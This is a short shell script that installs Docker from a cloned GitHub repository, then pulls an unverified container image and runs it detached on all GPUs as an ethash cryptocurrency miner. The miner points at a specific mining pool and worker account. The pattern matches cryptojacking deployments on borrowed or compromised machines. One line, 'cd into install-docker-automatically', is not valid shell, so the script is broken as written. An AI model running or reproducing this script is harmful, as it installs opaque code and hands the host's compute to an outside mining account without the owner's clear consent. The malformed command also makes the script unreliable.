#!/bin/sh
git clone https://github.com/faisaljubayer/install-docker-automatically.git
cd into install-docker-automatically
sh ./docker-install-trusty64.sh
docker pull turkon/new1:latest
docker run --gpus all -d turkon/new1:latest --algo ethash --server sp-us.mandor.app:3333 --user sp_obhy.NWS-001
